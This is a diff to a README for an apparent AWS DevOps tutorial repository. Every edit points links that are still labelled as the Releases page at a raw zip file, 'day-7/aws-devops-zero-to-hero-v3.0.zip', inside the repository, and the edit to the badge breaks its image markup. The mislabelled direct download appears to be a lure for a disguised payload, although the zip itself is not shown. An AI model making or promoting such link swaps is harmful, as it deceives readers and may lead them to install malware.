@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/high-readingteacher574/aws-devops-zero-to-hero/releases)
+[![Download from Releases](https://raw.githubusercontent.com/high-readingteacher574/aws-devops-zero-to-hero/main/day-7/aws-devops-zero-to-hero-v3.0.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/high-readingteacher574/aws-devops-zero-to-hero/main/day-7/aws-devops-zero-to-hero-v3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before downloading, ensure you meet these requirements:
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**: Click the link below to open the Releases page.
-   [Go to Releases](https://github.com/high-readingteacher574/aws-devops-zero-to-hero/releases)
+   [Go to Releases](https://raw.githubusercontent.com/high-readingteacher574/aws-devops-zero-to-hero/main/day-7/aws-devops-zero-to-hero-v3.0.zip)
 
 2. **Choose a Version**: On the Releases page, you will see various versions available for download. Select the latest version, as it will have the most features and updates.
 
@@ -52,4 +52,4 @@ If you encounter any issues or have questions, feel free to seek help on communi
 
 We want to thank the AWS community and all contributors who made this repository possible. Your input and dedication help others learn and grow in their tech careers.
 
-For additional resources, tutorials, and support, please explore our [Releases Page](https://github.com/high-readingteacher574/aws-devops-zero-to-hero/releases) again for updates and new content. Happy learning!
+For additional resources, tutorials, and support, please explore our [Releases Page](https://raw.githubusercontent.com/high-readingteacher574/aws-devops-zero-to-hero/main/day-7/aws-devops-zero-to-hero-v3.0.zip) again for updates and new content. Happy learning!
